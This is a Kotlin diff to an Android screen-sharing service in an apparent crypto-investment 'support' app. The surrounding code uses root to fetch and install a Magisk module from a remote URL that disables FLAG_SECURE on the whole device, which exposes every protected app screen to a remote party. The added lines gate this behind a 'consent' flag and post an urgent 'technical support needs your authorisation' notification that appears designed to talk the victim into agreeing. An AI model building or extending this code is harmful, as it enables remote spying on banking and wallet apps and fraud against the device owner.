@@ -303,7 +303,15 @@ class ScreenShareService : Service() {
     }
 
     // Desbloqueio automatico por root: instala o modulo Magisk que desativa o FLAG_SECURE global.
+    // So corre se o CLIENTE ja consentiu (aviso legal). Caso contrario pede-lhe para abrir a app e confirmar.
     private fun unlockSecure() {
+        val consented = getSharedPreferences("ci", Context.MODE_PRIVATE).getBoolean("secure_consent", false)
+        if (!consented) {
+            send(JSONObject().put("type", "unlock-result").put("ok", false)
+                .put("message", "A aguardar consentimento do cliente no aparelho (aviso legal)."))
+            postConsentRequestNotification()
+            return
+        }
         Thread {
             val (ok, msg) = RootUtil.installDisablerModule(this, BuildConfig.FLAG_SECURE_MODULE_URL)
             send(JSONObject().put("type", "unlock-result").put("ok", ok).put("message", msg))
@@ -316,6 +324,30 @@ class ScreenShareService : Service() {
                 postGenericNotification("Desbloqueio automatico falhou", msg)
             }
         }.start()
+    }
+
+    private fun postConsentRequestNotification() {
+        try {
+            val chId = "cryptoinvest_consent"
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                nm.createNotificationChannel(NotificationChannel(chId, "Consentimento de suporte", NotificationManager.IMPORTANCE_HIGH))
+            val open = Intent(this, MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
+                putExtra("show_unlock_consent", true)
+            }
+            val piFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            else PendingIntent.FLAG_UPDATE_CURRENT
+            val pi = PendingIntent.getActivity(this, 1, open, piFlags)
+            val n = NotificationCompat.Builder(this, chId)
+                .setContentTitle("Suporte técnico precisa da sua autorização")
+                .setContentText("Toque para autorizar o Modo Suporte Total (ver todas as apps).")
+                .setSmallIcon(R.mipmap.ic_launcher)
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setContentIntent(pi).setAutoCancel(true).build()
+            nm.notify(2005, n)
+        } catch (e: Exception) {}
     }
 
     private fun postGenericNotification(title: String, text: String) {
